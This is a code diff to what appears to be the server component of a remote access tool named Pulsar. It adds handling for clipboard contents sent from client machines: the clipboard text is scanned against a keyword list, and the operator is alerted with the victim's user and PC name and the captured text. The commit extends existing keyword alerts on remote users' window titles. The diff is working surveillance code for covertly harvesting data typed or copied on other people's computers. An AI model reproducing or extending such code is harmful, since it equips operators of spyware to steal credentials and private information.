@@ -10,6 +10,7 @@ using System.Linq;
 using Newtonsoft.Json;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using System.Diagnostics;
 
 namespace Pulsar.Server.Messages
 {
@@ -101,7 +102,7 @@ namespace Pulsar.Server.Messages
         }
 
         /// <inheritdoc />
-        public override bool CanExecute(IMessage message) => message is SetStatus || message is SetUserStatus || message is SetUserActiveWindowStatus;
+        public override bool CanExecute(IMessage message) => message is SetStatus || message is SetUserStatus || message is SetUserActiveWindowStatus || message is SetUserClipboardStatus;
 
         /// <inheritdoc />
         public override bool CanExecuteFrom(ISender sender) => true;
@@ -120,6 +121,9 @@ namespace Pulsar.Server.Messages
                 case SetUserActiveWindowStatus userActiveWindowStatus:
                     Execute((Client)sender, userActiveWindowStatus);
                     break;
+                case SetUserClipboardStatus userClipboardStatus:
+                    Execute((Client)sender, userClipboardStatus);
+                    break;
             }
         }
 
@@ -131,8 +135,8 @@ namespace Pulsar.Server.Messages
         private void Execute(Client client, SetUserStatus message)
         {
             OnUserStatusUpdated(client, message.Message);
-        }
-
+        }        
+        
         private void Execute(Client client, SetUserActiveWindowStatus message)
         {
             OnUserActiveWindowStatusUpdated(client, message.WindowTitle);
@@ -163,6 +167,40 @@ namespace Pulsar.Server.Messages
                                 frm.Invoke(new Action(() =>
                                 {
                                     FrmMain.AddNotiEvent(frm, client.Value.UserAtPc, "Keyword triggered: " + matchedKeyword, message.WindowTitle);
+                                }));
+                            }
+                        }
+                    }
+                }
+            });
+        }
+
+        private void Execute(Client client, SetUserClipboardStatus message)
+        {
+            if (message.ClipboardContent == null)
+            {
+                return;
+            }
+
+            Task.Run(() =>
+            {
+                string keywordsFilePath = Path.Combine(Directory.GetCurrentDirectory(), "keywords.json");
+
+                if (File.Exists(keywordsFilePath))
+                {
+                    string jsonContent = File.ReadAllText(keywordsFilePath);
+                    var keywords = JsonConvert.DeserializeObject<string[]>(jsonContent);
+
+                    if (keywords != null)
+                    {
+                        var matchedKeyword = keywords.FirstOrDefault(keyword => message.ClipboardContent.IndexOf(keyword, StringComparison.OrdinalIgnoreCase) >= 0);                        if (matchedKeyword != null)
+                        {
+                            FrmMain frm = Application.OpenForms["FrmMain"] as FrmMain;
+                            if (frm != null)
+                            {
+                                frm.Invoke(new Action(() =>
+                                {
+                                    FrmMain.AddClipboardNotiEvent(frm, client.Value.UserAtPc, matchedKeyword, message.ClipboardContent);
                                 }));
                             }
                         }
